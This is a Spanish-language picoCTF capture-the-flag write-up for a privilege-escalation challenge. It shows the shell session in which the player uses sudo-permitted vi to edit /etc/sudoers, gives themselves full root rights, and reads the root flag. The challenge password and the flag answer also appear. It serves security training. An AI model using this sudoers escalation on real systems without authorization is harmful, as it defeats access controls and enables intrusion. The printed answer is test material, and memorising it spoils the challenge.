## Descripción del reto
Can you read files in the root file?
Additional details will be available after launching your challenge instance.

The system admin has provisioned an account for you on the main server:`ssh -p 62853 picoplayer@saturn.picoctf.net`Password: `j4ks-9nxB-`Can you login and read the root file?

## Solución

- Entrar de forma segura al servidor.
```
BLOODANGELIX-picoctf@webshell:~$ ssh -p 53387 picoplayer@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:53387 ([13.59.203.175]:53387)' can't be established.
ED25519 key fingerprint is SHA256:HKm/Bw1C+mhj23vO8tXULrgLFYvzP6gQH2IwgUiQTok.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:7: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:53387' (ED25519) to the list of known hosts.
picoplayer@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 6.8.0-1035-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
```

- Muestra los comandos que puede ejecutar el usuario, después intentamos acceder a la carpeta root, pero ya que no es posible acceder, pues accedemos al directorio base con *cd /*, y mostramos los directorios y archivos. En seguida entramos al directorio *etc* en donde se encuentra el archivo *sudoers*, y para modificarlo utilizamos el comando *sudo vi sudoers*.
```
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ cd /root
-bash: cd: /root: Permission denied

picoplayer@challenge:~$ cd /
picoplayer@challenge:/$ ls -l
total 0
lrwxrwxrwx   1 root   root      7 Mar  8  2023 bin -> usr/bin
drwxr-xr-x   2 root   root      6 Apr 15  2020 boot
d---------   1 root   root     27 Aug  4  2023 challenge
drwxr-xr-x   5 root   root    340 Sep 14 03:50 dev
drwxr-xr-x   1 root   root     66 Sep 14 03:50 etc
drwxr-xr-x   1 root   root     24 Aug  4  2023 home
lrwxrwxrwx   1 root   root      7 Mar  8  2023 lib -> usr/lib
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root   root      9 Mar  8  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root   root     10 Mar  8  2023 libx32 -> usr/libx32
drwxr-xr-x   2 root   root      6 Mar  8  2023 media
drwxr-xr-x   2 root   root      6 Mar  8  2023 mnt
drwxr-xr-x   2 root   root      6 Mar  8  2023 opt
dr-xr-xr-x 213 nobody nogroup   0 Sep 14 03:50 proc
drwx------   1 root   root     23 Aug  4  2023 root
drwxr-xr-x   1 root   root     66 Sep 14 03:53 run
lrwxrwxrwx   1 root   root      8 Mar  8  2023 sbin -> usr/sbin
drwxr-xr-x   2 root   root      6 Mar  8  2023 srv
dr-xr-xr-x  13 nobody nogroup   0 Sep 14 03:50 sys
drwxrwxrwt   1 root   root      6 Aug  4  2023 tmp
drwxr-xr-x   1 root   root     18 Mar  8  2023 usr
drwxr-xr-x   1 root   root     17 Mar  8  2023 var
picoplayer@challenge:/$ cd etc 
picoplayer@challenge:/etc$ ls
adduser.conf            debconf.conf    gshadow      kernel         magic.mime           pam.conf   rc4.d        ssh          timezone
alternatives            debian_version  gshadow-     ld.so.cache    mailcap              pam.d      rc5.d        ssl          tmpfiles.d
apt                     default         gss          ld.so.conf     mailcap.order        passwd     rc6.d        subgid       ucf.conf
bash.bashrc             deluser.conf    host.conf    ld.so.conf.d   mime.types           passwd-    rcS.d        subgid-      ufw
bindresvport.blacklist  dhcp            hostname     legal          mke2fs.conf          profile    resolv.conf  subuid       update-motd.d
binfmt.d                dpkg            hosts        libaudit.conf  modules-load.d       profile.d  rmt          subuid-      vim
ca-certificates         e2scrub.conf    hosts.allow  localtime      mtab                 python3    security     sudoers      wgetrc
ca-certificates.conf    environment     hosts.deny   login.defs     networkd-dispatcher  python3.8  selinux      sudoers.d    xattr.conf
cloud                   fstab           init.d       logrotate.d    networks             rc0.d      shadow       sysctl.conf  xdg
cron.d                  gai.conf        inputrc      lsb-release    nsswitch.conf        rc1.d      shadow-      sysctl.d
cron.daily              group           issue        machine-id     opt                  rc2.d      shells       systemd
dbus-1                  group-          issue.net    magic          os-release           rc3.d      skel         terminfo
picoplayer@challenge:/etc$ sudo vi sudoers

[1]+  Stopped                 sudo vi sudoers
picoplayer@challenge:/etc$ sudo vi sudoers
```

- Al haber modificado el archivo ingresando los permisos necesarios al usuario picoplayer (picoplayer ALL=(ALL:ALL) ALL), ahora vemos si la modificación del archivo fue exitosa, después dentro del directorio root, buscamos el archivo que contiene la bandera y vemos su interior.
```
picoplayer@challenge:/etc$ sudo -l
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL : ALL) ALL
    (ALL) /usr/bin/vi
picoplayer@challenge:/etc$ sudo ls -a /root
.  ..  .bashrc  .flag.txt  .profile  .viminfo
picoplayer@challenge:/etc$ sudo ls -a /root/.flag.txt
/root/.flag.txt
picoplayer@challenge:/etc$ sudo cat /root/.flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}
picoplayer@challenge:/etc$ Connection to saturn.picoctf.net closed by remote host.
Connection to saturn.picoctf.net closed.
BLOODANGELIX-picoctf@webshell:~$ 
```

picoCTF{uS1ng_v1m_3dit0r_021d10ab}
## Notas
sudo -l: Muestra los comandos que puede realizar el usuario actual con *sudo*.
ls -l: Muestra los directorios y archivos con todos los detalles.
sudo vi sudoers: Abre el archivo sudoers con vi, para editar lo que hay dentro de el.
sudo ls -a /root: Muestra la lista de los archivos dentro del directorio root.
sudo cat /root/.flag.txt: Muestra el contenido del archivo *.flag* dentro del directorio root.

Para salirte de visudoers, presiona la tecla ESC y : al mismo tiempo wq!. Esto guardara las modificaciones hechas.

## Referencia